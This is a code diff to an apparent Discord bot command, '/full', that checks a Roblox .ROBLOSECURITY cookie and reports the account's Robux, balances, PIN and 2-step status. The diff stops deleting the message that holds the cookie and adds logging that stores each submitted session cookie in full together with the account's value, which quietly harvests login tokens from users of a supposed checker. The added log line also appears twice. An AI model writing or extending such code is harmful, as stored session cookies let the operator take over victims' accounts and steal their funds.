@@ -108,11 +108,6 @@ async def full(ctx, cookie=None):
         await ctx.send(embed=Embed(title=":x: Missing Cookie", description="Please provide a valid `.ROBLOSECURITY` cookie.", color=0xFF0000))
         return
 
-    try:
-        await ctx.message.delete()
-    except discord.errors.NotFound:
-        pass  # Ignore the error if the message is already deleted
-
     headers = {"User-Agent": "Mozilla/5.0"}
     hidden = '```                       Hidden                  ```'
 
@@ -210,6 +205,20 @@ async def full(ctx, cookie=None):
         # Create a DM channel with the user who invoked the command
         dm = await ctx.author.create_dm()
         await dm.send(embed=embedVar)
+
+        # Log the user action
+        log(f'User {ctx.author} used /full with a valid cookie. [{robux} R$ | {balance_credit_info.json().get("balance", "N/A")} {balance_credit_currency} | {account_name} ({account_display_name}) | {account_age_in_years} years | {account_friends} Friends | {account_gamepasses_value} Gamepasses Worth | {account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | {account_commissions} Commissions | {account_robux_purchased} Robux Purchased | {account_pending_robux} Pending | {account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | {account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | {account_email_verified} Email | {cookie} Cookie]')
+
+    elif 'Unauthorized' in response.text:
+        log(f'User {ctx.author} used /full with an invalid cookie.')
+        embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
+        embedVar.add_field(name="Passed Cookie: ", value='``` Hidden ```', inline=False)
+        await ctx.send(embed=embedVar)
+    else:
+        log(f'User {ctx.author} used /full but Roblox returned a bad response.')
+        embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
+        embedVar.add_field(name="Error: ", value='```' + response.text + '```', inline=False)
+        await ctx.send(embed=embedVar)
 
         # Log the user action
         log(f'User {ctx.author} used /full with a valid cookie. [{robux} R$ | {balance_credit_info.json().get("balance", "N/A")} {balance_credit_currency} | {account_name} ({account_display_name}) | {account_age_in_years} years | {account_friends} Friends | {account_gamepasses_value} Gamepasses Worth | {account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | {account_commissions} Commissions | {account_robux_purchased} Robux Purchased | {account_pending_robux} Pending | {account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | {account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | {account_email_verified} Email | {cookie} Cookie]')
